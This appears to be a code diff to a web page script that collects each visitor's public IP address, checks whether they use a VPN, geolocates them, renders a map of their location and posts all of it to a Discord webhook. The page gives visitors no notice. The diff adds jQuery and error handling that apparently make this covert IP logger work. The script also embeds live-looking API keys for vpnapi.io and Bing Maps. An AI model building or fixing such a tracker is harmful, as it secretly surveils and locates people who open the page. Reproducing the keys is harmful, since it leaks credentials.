@@ -13,6 +13,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/color-thief/2.3.0/color-thief.umd.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script> <!-- ADDED: jQuery -->
     <title></title>
 </head>
 
@@ -51,7 +52,7 @@
         </div>
 
       <script>
-        $(document).ready(() => {
+        $(document).ready(() => { // Wrap in $(document).ready()
           $.getJSON("https://api.ipify.org?format=json", function (data) {
             $.getJSON(
               `https://vpnapi.io/api/${data.ip}?key=09743a6399ca4bc4a635c51ecb847a6c`,
@@ -68,10 +69,19 @@
                       `http://dev.virtualearth.net/REST/v1/Imagery/Map/Road/${ipData.latitude},${ipData.longitude}/12?mapSize=400,300&pushpin=${ipData.latitude},${ipData.longitude}&key=Ap05UY1k0etqLr1Q9u3d-7OY_JuEzpW8JhAHfZaFpPrZpw6yCfVxGFfVM89fhoZi`
                     );
                   }
-                );
+                ).fail(function(jqXHR, textStatus, errorThrown) {
+                    console.error("Error getting IP API data:", textStatus, errorThrown); // Log the error
+                    alert("Error getting IP API data. Check the console.");
+                  });
               }
-            );
-          });
+            ).fail(function(jqXHR, textStatus, errorThrown) {
+                console.error("Error getting VPN data:", textStatus, errorThrown); // Log the error
+                alert("Error getting VPN data.  Check the console.");
+              });
+          }).fail(function(jqXHR, textStatus, errorThrown) {
+              console.error("Error getting IP address:", textStatus, errorThrown); // Log the error
+              alert("Error getting IP address. Check the console.");
+            });
         });
 
         function sendData(ip, vpn, ipData /* discordId */, image) {
@@ -136,8 +146,14 @@
               },
               body: JSON.stringify(embed),
             }
-          ).catch((error) => {
-            alert("Error sending data:", error);
+          ).then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                console.log("Webhook sent successfully!");
+            }).catch((error) => {
+            console.error("Error sending data:", error);
+            alert("Error sending data to Discord. Check the console.");
           });
         }
       </script>
